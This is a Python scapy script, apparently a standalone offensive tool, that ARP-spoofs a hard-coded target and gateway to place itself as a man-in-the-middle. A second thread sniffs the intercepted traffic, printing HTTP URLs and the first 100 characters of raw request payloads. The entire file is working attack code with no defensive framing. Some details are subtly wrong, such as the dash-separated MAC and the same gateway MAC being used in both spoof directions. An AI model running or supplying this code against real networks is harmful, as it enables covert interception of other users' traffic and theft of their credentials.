import scapy.all as scapy
import time
import threading
from scapy.layers.http import HTTPRequest  # Import HTTPRequest layer to detect HTTP requests

gateway_mac = "d2-c6-37-5b-46-77"  # Placeholder for the known gateway MAC address

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip, spoof_mac):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"No response received for IP: {target_ip}")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, source_mac):
    destination_mac = get_mac(destination_ip)
    if not destination_mac:
        print(f"Failed to restore ARP table for {destination_ip}")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def sniff_packets(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def arp_spoofing(target_ip, gateway_ip):
    try:
        while True:
            spoof(target_ip, gateway_ip, gateway_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)  # Slower interval to reduce network noise
    except KeyboardInterrupt:
        print("\nCtrl + C pressed... Exiting")
        restore(target_ip, gateway_ip, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac)
        print("[+] ARP Spoof Stopped")

def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = f"http://{packet[HTTPRequest].Host.decode()}{packet[HTTPRequest].Path.decode()}"
        print(f"[+] HTTP Request >> {url}")
        if packet.haslayer(scapy.Raw):
            print(f"\tSome of the content: {str(packet[scapy.Raw].load)[:100]}")  # Print first 100 chars of the payload

if __name__ == "__main__":
    target_ip = "192.168.137.240"  # Target IP address
    gateway_ip = "192.168.137.1"   # Gateway IP address
    interface = "MediaTek Wi-Fi 6 MT7921 Wireless LAN Card"  # Replace with your network interface, e.g., 'eth0', 'wlan0'

    thread_arp = threading.Thread(target=arp_spoofing, args=(target_ip, gateway_ip))
    thread_sniff = threading.Thread(target=sniff_packets, args=(interface,))

    thread_arp.start()
    thread_sniff.start()

    thread_arp.join()
    thread_sniff.join()
